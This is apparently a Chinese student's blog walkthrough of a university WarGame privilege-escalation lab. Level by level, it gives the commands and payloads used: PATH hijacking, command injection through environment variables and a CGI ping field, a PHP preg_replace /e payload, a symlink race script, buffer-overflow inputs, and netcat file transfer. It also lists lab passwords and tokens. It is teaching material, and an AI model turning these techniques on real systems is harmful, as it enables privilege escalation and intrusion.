---
title: WarGame闯关笔记
date: 2021/12/17 16:53:35
tags: 
- Cyber Security
categories:
- CS
description: NJU陈健老师网络攻防实战课程作业WarGame
cover: /img/Science.jpg
---

# WarGame简介

[虚拟机及题目链接](https://box.nju.edu.cn/d/10484f123139461d9412/)

WarGame提供的虚拟机镜像是一个基于 Linux 的漏洞挖掘的练习闯关平台。闯关者需要从中找到漏洞并突破权限。相信在完成该平台的练习后，你将对漏洞挖掘的原理有一个较为透彻的理解，并掌握漏洞挖掘的基本方法。

该平台的每一个关卡对应一个名为 levelXX 的账号，密码与账号名相同。在完成每一关 的 题 目 之 前 ， 你 需 要 用 对 应 的 账 号 登 录 系 统 。 每 个 关 卡 的 题 目 对 应 的 文 件 都 放 在 /home/flagXX 目录中。例如，第一关的账号名是 level01，密码也是 level01，如果这个关卡 有需要攻击的包含漏洞的程序，那么相应的程序就放在/home/flag01 目录中。每个关卡的内 容介绍和相关程序的源代码可以在本实验讲义后面对应的 Level 小节中获得。 
/home/flagXX 目录中的程序具备 SUID 权限。例如在关卡 level01 中，用 level01 账号登 录进系统，然后执行/home/flag01/flag01，程序将以 flag01 的身份运行。当你利用该程序的 漏洞提升自己的权限后，你的身份就将变为 flag01。提权成功后，你需要执行/bin/getflagXX 程序（对本例来说，就是执行/bin/getflag01），如果你确实是以 flagXX 的身份运行该程序， 就将获得提示：“Congratulation! The flag is xxx-xxx”，否则获得的提示为：“Wrong, You are in  a  non-flag  account”。每个关卡的最终目的就是利用程序漏洞提升自己的权限，然后想办 法执行/bin/getflagXX 程序并获得 flag。 

# Level00

查找具有SUID权限的程序，找到 /bin/.../flag00: find / -perm /4000

PS：老师是不是发虚拟机之前调用了flag00，历史指令按两下就出现了flag00，不过这大概不能算是另一种做法吧~

![00](https://s2.loli.net/2021/12/17/8OpRzalEdNQXHcm.png)

# Level01

1.	在用户目录下创建符号链接echo, 链接到getflag: ln -s /bin/getflag01 ~/echo
2.	将自己的用户目录添加到环境变量中: export PATH=/home/level01/:$PATH
3.	执行flag01, 它会帮我们运行 /bin/getflag01

![01](https://s2.loli.net/2021/12/17/sV9kgcCtlev1Eox.png)

# Level02

1.	修改用户名, 使其闭合前一个语句并在后面执行getflag: export USER="name && /bin/getflag02 &&"
2.	执行flag02

![02](https://s2.loli.net/2021/12/17/eiB3xrV5taovC4M.png)

# Level03

1.	在用户目录下写一个getflag( /bin/getflag03 > ~/flag), 将它拷贝到漏洞目录下
2.	等待一会crontab执行, 查看获得flag

![03](https://s2.loli.net/2021/12/17/XxwEAyrfPTRWchu.png)

# Level04

1. 在用户目录下创建链接至/home/flag04/token
2. 执行flag04, 查看token
3.	切换到用户flag04, 执行/bin/getflag04

![04](https://s2.loli.net/2021/12/17/43lnuvaASCTp7mK.png)

# Level05

1.	将压缩包解压到用户目录下: tar zxvf backup-2017.tar.gz -C ~/
2.	使用ssh密钥登录flag05: ssh -i .ssh/id_rsa flag05@192.168.195.128
3.	运行/bin/flag05获得flag

![05](https://s2.loli.net/2021/12/17/5zaHnPuKIGVdlhJ.png)

# Level06

1.	查看/etc/passwd, 发现flag06密码的密文存在了这里
2.	使用kali的john插件进行破解, 得到flag06的密码 ftc
3.	登录用户flag06, 运行/bin/getflag06

![06](https://s2.loli.net/2021/12/17/JIARGCDTc7Y5kKg.png)

# Level07

1.	index.cgi监听端口8888, CGI采用get方法响应请求, 该程序传输 Host参数
2.	构造语句闭合ping命令( ||/bin/getflag07)

![07](https://s2.loli.net/2021/12/17/2Xz7KtonCUbvw1O.png)

# Level08

1. 使用nc将capture.pcap传到kali:
   + 靶机 nc -lp 4455 < capture.pcap -q 1
   + 攻击机 nc -nv 192.168.1.233 4455 > cap.pcap
2. 使用Wireshark进行分析, 追踪TCP流, 得到Password: backd00Rmate
3.	登录flag08, 执行/bin/getflag08得到flag

![08](https://s2.loli.net/2021/12/17/irc9RutBzyMflPw.png)

# Level09

1. 注意到代码

   `$contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);`

   preg_replace第一参数使用了**/e模式**，preg_replace的第二个参数会作为代码执行。

2. 用php中的system函数执行外部的shell命令，将`[email "{${system(getflag)}}"]`写入/tmp/atk

3. ./flag19 /tmp/atk 获得flag

![09](https://s2.loli.net/2021/12/17/xtDB1MIp5dhWG6j.png)

# Level10



1. flag10程序判断用户是否拥有读该文件的权限, 如果有, 通过18888端口发送给指定host

2. kali机永久监听18888端口, 并将内容输出到log: ncat -lp 18888 -k >> log

3. 编写条件竞争脚本switch.sh

   ```shell
   #!/bin/sh
   while true
   do
   	 ln -s /home/level10/null /home/level10/fake
   	 unlink /home/level10/fake
   	 ln -s /home/flag10/token /home/level10/fake
   	 unlink /home/level10/fake
   done
   ```

4. 编写运行脚本start.sh

   ```shell
   #!/bin/sh
   while true
   do
   	/home/flag10/flag10 /home/level10/fake 192.168.1.114
   done
   ```

5. 以1优先级后台运行switch.sh, 以19优先级运行start.sh

   ```shell
   $ nice -n1 sh switch.sh &
   $ nice -n19 sh start.sh
   ```

6. 在kali机查看log, 得到token( b3c5-6d82-7sfc), 登录flag10, 获得flag

![10](https://s2.loli.net/2021/12/17/cPBrLyX13I879Vw.png)

# Level12

1.	连接50000端口的lua服务： nc -nv 127.0.0.1 50000
2.	输入指令闭合语句，获得flag： ; /bin/getflag12 > ~/flag; #

![12](https://s2.loli.net/2021/12/17/f87u1qP3BDGRkSA.png)

# Level13

1. 使用gdb调试程序： gdb ./flag13
2. 在main中打断点： (gdb) b main
3. (gdb) display /20i $pc，查看20行汇编
3.	运行，然后单步调试到 ”=> 0x080484f4 <+48>:    cmp eax, 0x3e8“
4.	修改寄存器eax的值为0x3e8： (gdb) set $eax=0x3e8
5.	继续执行得到token（b705702b-76a8-42b0-8844-3adabbe5ac58），登录flag13获得flag

![13](https://s2.loli.net/2021/12/17/YIGEpuAU2cn3bm6.png)

# Level14

1.	运行flag14，观察发现加密算法是 str[i] += i;
2.	将加密的token进行解密，得到 318d229.998d.5f
3.	登录flag14，获得flag

![14](https://s2.loli.net/2021/12/17/WIqh7TVeHaybcUL.png)

# Level16

1. 编写脚本 /tmp/getflag：

   ```shell
   #!/bin/sh
   /bin/getflag16 > /tmp/flag
   ```

2. 写一个html表单，在username中提交 ";a=/tmp/getflag;${a,,};

3. 查看 /tmp/flag 获得 flag

![16](https://s2.loli.net/2021/12/17/IKbFR3rsEUimOtk.png)

# level19

1. 编写脚本，fork一个子进程，然后父进程退出，子进程执行 /home/flag19/flag19

   ```C
   #include<stdio.h>
   #include<unistd.h>
   #include<stdlib.h>
   int main(){ 
       char* args[] = {"/bin/sh", "-c", "/bin/getflag19>/tmp/flag_19", NULL};  
       if(!fork()){
            execve("/home/flag19/flag19", args, NULL);
   	} else {
            exit(0);
       }
       return 0;
   }编译链接执行，查看输出获得flag
   ```

2. 编译链接执行，查看输出获得flag

![19](https://s2.loli.net/2021/12/17/JHGR3MuEAkh9mFn.png)

# Level20

1. 输入65个'a'给flag20程序，造成数组越界，修改modified的值不为0，获得flag：

   ```shell
   $ for i in {0..64};do echo -n 'a' >> /tmp/overflow20;done;
   $ cat /tmp/overflow20 | ./flag20
   ```

![20](https://s2.loli.net/2021/12/17/23twKc1QB9SWaVn.png)

# Level21

1. 越界后修改modified为0x56575859 (也就是 VWXY)：

   ```shell
   $ ./flag21 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaYXWV
   ```

![21](https://s2.loli.net/2021/12/17/Fb864t9OyxkKpe7.png)

# Level22

1. 编写添加环境变量的脚本 /tmp/atk22.c

   ```C
   #include<stdio.h>
   int main(){
     printf("export NJUCS='aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%c%c%c%c'", 0x0a, 0x0d, 0x0a, 0x0d);
   }
   ```

2. 编译运行，将输出结果添加到 ~/.bashrc 中，刷新

   ```shell
   $ gcc /tmp/atk22.c -o /tmp/atck22$ /tmp/atk22 >> ~/.bashrc
   $ source ~/.bashrc
   ```

3. 运行 ./flag22 ，获得flag

![22](https://s2.loli.net/2021/12/17/Oswi9ESBJHWjD2h.png)

# Level23

1. (gdb) x win 查看win函数地址，为 0x804846b

2. 编写/tmp/atk23.c

   ```c
   #include<stdio.h>
   int main() {
    printf("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%c%c%c%c", 0x6b, 0x84, 0x04, 0x08);
   }
   ```

3. 构造payload，运行

![23](https://s2.loli.net/2021/12/17/a4OvYFqQZA1uxRP.png)
